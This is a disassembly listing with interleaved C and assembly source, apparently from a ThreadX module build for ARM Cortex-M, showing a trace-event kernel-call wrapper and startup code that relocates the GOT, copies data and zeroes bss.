 80217b8:	6879      	ldr	r1, [r7, #4]
 80217ba:	2059      	movs	r0, #89	; 0x59
 80217bc:	47a0      	blx	r4
}
 80217be:	bf00      	nop
 80217c0:	370c      	adds	r7, #12
 80217c2:	46bd      	mov	sp, r7
 80217c4:	bd90      	pop	{r4, r7, pc}
 80217c6:	bf00      	nop
 80217c8:	00000004 	.word	0x00000004

080217cc <_tx_trace_user_event_insert>:
/*                                            CALL_NOT_USED option,       */
/*                                            resulting in version 6.1.10 */
/*                                                                        */
/**************************************************************************/
UINT _tx_trace_user_event_insert(ULONG event_id, ULONG info_field_1, ULONG info_field_2, ULONG info_field_3, ULONG info_field_4)
{
 80217cc:	b590      	push	{r4, r7, lr}
 80217ce:	b089      	sub	sp, #36	; 0x24
 80217d0:	af00      	add	r7, sp, #0
 80217d2:	60f8      	str	r0, [r7, #12]
 80217d4:	60b9      	str	r1, [r7, #8]
 80217d6:	607a      	str	r2, [r7, #4]
 80217d8:	603b      	str	r3, [r7, #0]

UINT return_value;
ALIGN_TYPE extra_parameters[3];

    extra_parameters[0] = (ALIGN_TYPE) info_field_2;
 80217da:	687b      	ldr	r3, [r7, #4]
 80217dc:	613b      	str	r3, [r7, #16]
    extra_parameters[1] = (ALIGN_TYPE) info_field_3;
 80217de:	683b      	ldr	r3, [r7, #0]
 80217e0:	617b      	str	r3, [r7, #20]
    extra_parameters[2] = (ALIGN_TYPE) info_field_4;
 80217e2:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 80217e4:	61bb      	str	r3, [r7, #24]

    /* Call module manager dispatcher.  */
    return_value = (UINT) (_txm_module_kernel_call_dispatcher)(TXM_TRACE_USER_EVENT_INSERT_CALL, (ALIGN_TYPE) event_id, (ALIGN_TYPE) info_field_1, (ALIGN_TYPE) extra_parameters);
 80217e6:	4b08      	ldr	r3, [pc, #32]	; (8021808 <_tx_trace_user_event_insert+0x3c>)
 80217e8:	f859 3003 	ldr.w	r3, [r9, r3]
 80217ec:	681c      	ldr	r4, [r3, #0]
 80217ee:	f107 0310 	add.w	r3, r7, #16
 80217f2:	68ba      	ldr	r2, [r7, #8]
 80217f4:	68f9      	ldr	r1, [r7, #12]
 80217f6:	205b      	movs	r0, #91	; 0x5b
 80217f8:	47a0      	blx	r4
 80217fa:	61f8      	str	r0, [r7, #28]

    /* Return value to the caller.  */
    return(return_value);
 80217fc:	69fb      	ldr	r3, [r7, #28]
}
 80217fe:	4618      	mov	r0, r3
 8021800:	3724      	adds	r7, #36	; 0x24
 8021802:	46bd      	mov	sp, r7
 8021804:	bd90      	pop	{r4, r7, pc}
 8021806:	bf00      	nop
 8021808:	00000004 	.word	0x00000004
 802180c:	00000000 	.word	0x00000000

08021810 <_gcc_setup>:

    .global _gcc_setup
    .thumb_func
_gcc_setup:

    STMDB   sp!, {r3, r4, r5, r6, r7, lr}             // Store other preserved registers
 8021810:	e92d 40f8 	stmdb	sp!, {r3, r4, r5, r6, r7, lr}

    ldr     r3, =__FLASH_segment_start__
 8021814:	4b2e      	ldr	r3, [pc, #184]	; (80218d0 <memory_set_done+0x2>)
    ldr     r4, =__RAM_segment_start__
 8021816:	4c2f      	ldr	r4, [pc, #188]	; (80218d4 <memory_set_done+0x6>)
    mov     r5,r0
 8021818:	4605      	mov	r5, r0

    /* Copy GOT table. */

    ldr     r0, =__got_load_start__
 802181a:	482f      	ldr	r0, [pc, #188]	; (80218d8 <memory_set_done+0xa>)
    sub     r0,r0,r3
 802181c:	eba0 0003 	sub.w	r0, r0, r3
    add     r0,r0,r5
 8021820:	4428      	add	r0, r5
    ldr     r1, =__new_got_start__
 8021822:	492e      	ldr	r1, [pc, #184]	; (80218dc <memory_set_done+0xe>)
    sub     r1,r1, r4
 8021824:	eba1 0104 	sub.w	r1, r1, r4
    add     r1,r1,r9
 8021828:	4449      	add	r1, r9
    ldr     r2, =__new_got_end__
 802182a:	4a2d      	ldr	r2, [pc, #180]	; (80218e0 <memory_set_done+0x12>)
    sub     r2,r2,r4
 802182c:	eba2 0204 	sub.w	r2, r2, r4
    add     r2,r2,r9
 8021830:	444a      	add	r2, r9

08021832 <new_got_setup>:

new_got_setup:
    cmp     r1, r2          // See if there are more GOT entries
 8021832:	4291      	cmp	r1, r2
    beq     got_setup_done  // No, done with GOT setup
 8021834:	d011      	beq.n	802185a <got_setup_done>
    ldr     r6, [r0]        // Pickup current GOT entry
 8021836:	6806      	ldr	r6, [r0, #0]
    cmp     r6, #0          // Is it 0?
 8021838:	2e00      	cmp	r6, #0
    beq     address_built   // Yes, just skip the adjustment
 802183a:	d008      	beq.n	802184e <address_built>
    cmp     r6, r4          // Is it in the code or data area?
 802183c:	42a6      	cmp	r6, r4
    blt     flash_area      // If less than, it is a code address
 802183e:	db03      	blt.n	8021848 <flash_area>
    sub     r6, r6, r4      // Compute offset of data area
 8021840:	eba6 0604 	sub.w	r6, r6, r4
    add     r6, r6, r9      // Build address based on the loaded data address
 8021844:	444e      	add	r6, r9
    b       address_built   // Finished building address
 8021846:	e002      	b.n	802184e <address_built>

08021848 <flash_area>:
flash_area:
    sub     r6, r6, r3      // Compute offset of code area
 8021848:	eba6 0603 	sub.w	r6, r6, r3
    add     r6, r6, r5      // Build address based on the loaded code address
 802184c:	442e      	add	r6, r5

0802184e <address_built>:
address_built:
    str     r6, [r1]        // Store in new GOT table
 802184e:	600e      	str	r6, [r1, #0]
    add     r0, r0, #4      // Move to next entry
 8021850:	f100 0004 	add.w	r0, r0, #4
    add     r1, r1, #4      //
 8021854:	f101 0104 	add.w	r1, r1, #4
    b       new_got_setup   // Continue at the top of the loop
 8021858:	e7eb      	b.n	8021832 <new_got_setup>

0802185a <got_setup_done>:
got_setup_done:

    /* Copy initialised sections into RAM if required. */
  
    ldr     r0, =__data_load_start__
 802185a:	4822      	ldr	r0, [pc, #136]	; (80218e4 <memory_set_done+0x16>)
    sub     r0,r0,r3
 802185c:	eba0 0003 	sub.w	r0, r0, r3
    add     r0,r0,r5
 8021860:	4428      	add	r0, r5
    ldr     r1, =__data_start__
 8021862:	4921      	ldr	r1, [pc, #132]	; (80218e8 <memory_set_done+0x1a>)
    sub     r1,r1, r4
 8021864:	eba1 0104 	sub.w	r1, r1, r4
    add     r1,r1,r9
 8021868:	4449      	add	r1, r9
    ldr     r2, =__data_end__
 802186a:	4a20      	ldr	r2, [pc, #128]	; (80218ec <memory_set_done+0x1e>)
    sub     r2,r2,r4
 802186c:	eba2 0204 	sub.w	r2, r2, r4
    add     r2,r2,r9
 8021870:	444a      	add	r2, r9
    bl      crt0_memory_copy
 8021872:	f000 f815 	bl	80218a0 <crt0_memory_copy>
  
    /* Zero bss. */
    
    ldr     r0, =__bss_start__
 8021876:	481e      	ldr	r0, [pc, #120]	; (80218f0 <memory_set_done+0x22>)
    sub     r0,r0,r4
 8021878:	eba0 0004 	sub.w	r0, r0, r4
    add     r0,r0,r9
 802187c:	4448      	add	r0, r9
    ldr     r1, =__bss_end__
 802187e:	491d      	ldr	r1, [pc, #116]	; (80218f4 <memory_set_done+0x26>)
    sub     r1,r1,r4
 8021880:	eba1 0104 	sub.w	r1, r1, r4
    add     r1,r1,r9
 8021884:	4449      	add	r1, r9
    mov     r2, #0
 8021886:	f04f 0200 	mov.w	r2, #0
    bl      crt0_memory_set
 802188a:	f000 f81a 	bl	80218c2 <crt0_memory_set>

    
    LDMIA   sp!, {r3, r4, r5, r6, r7, lr}       // Store other preserved registers
 802188e:	e8bd 40f8 	ldmia.w	sp!, {r3, r4, r5, r6, r7, lr}
    bx      lr                                  // Return to caller
 8021892:	4770      	bx	lr
 8021894:	f3af 8000 	nop.w
 8021898:	f3af 8000 	nop.w
 802189c:	f3af 8000 	nop.w

080218a0 <crt0_memory_copy>:

  /* Startup helper functions. */

    .thumb_func
crt0_memory_copy:
    cmp     r0, r1
 80218a0:	4288      	cmp	r0, r1
    beq     memory_copy_done
 80218a2:	d00d      	beq.n	80218c0 <memory_copy_done>
    cmp     r2, r1
 80218a4:	428a      	cmp	r2, r1
    beq     memory_copy_done
 80218a6:	d00b      	beq.n	80218c0 <memory_copy_done>
    sub     r2, r2, r1
 80218a8:	eba2 0201 	sub.w	r2, r2, r1

080218ac <memory_copy_loop>:
memory_copy_loop:
    ldrb    r3, [r0]
 80218ac:	7803      	ldrb	r3, [r0, #0]
    add     r0, r0, #1
 80218ae:	f100 0001 	add.w	r0, r0, #1
    strb    r3, [r1]
 80218b2:	700b      	strb	r3, [r1, #0]
    add     r1, r1, #1
 80218b4:	f101 0101 	add.w	r1, r1, #1
    sub     r2, r2, #1
 80218b8:	f1a2 0201 	sub.w	r2, r2, #1
    cmp     r2, #0
 80218bc:	2a00      	cmp	r2, #0
    bne     memory_copy_loop
 80218be:	d1f5      	bne.n	80218ac <memory_copy_loop>

080218c0 <memory_copy_done>:
memory_copy_done:
    bx      lr
 80218c0:	4770      	bx	lr

080218c2 <crt0_memory_set>:

    .thumb_func
crt0_memory_set:
    cmp     r0, r1
 80218c2:	4288      	cmp	r0, r1
    beq     memory_set_done
 80218c4:	d003      	beq.n	80218ce <memory_set_done>
    strb    r2, [r0]
 80218c6:	7002      	strb	r2, [r0, #0]
    add     r0, r0, #1
 80218c8:	f100 0001 	add.w	r0, r0, #1
    b       crt0_memory_set
 80218cc:	e7f9      	b.n	80218c2 <crt0_memory_set>

080218ce <memory_set_done>:
memory_set_done:
    bx      lr
 80218ce:	4770      	bx	lr
    ldr     r3, =__FLASH_segment_start__
 80218d0:	08020000 	.word	0x08020000
    ldr     r4, =__RAM_segment_start__
 80218d4:	2001c000 	.word	0x2001c000
    ldr     r0, =__got_load_start__
 80218d8:	080218f8 	.word	0x080218f8
    ldr     r1, =__new_got_start__
 80218dc:	2001c000 	.word	0x2001c000
    ldr     r2, =__new_got_end__
 80218e0:	2001c028 	.word	0x2001c028
    ldr     r0, =__data_load_start__
 80218e4:	08021964 	.word	0x08021964
    ldr     r1, =__data_start__
 80218e8:	2001c028 	.word	0x2001c028
    ldr     r2, =__data_end__
 80218ec:	2001c028 	.word	0x2001c028
    ldr     r0, =__bss_start__
 80218f0:	2001c028 	.word	0x2001c028
    ldr     r1, =__bss_end__
 80218f4:	2001c854 	.word	0x2001c854
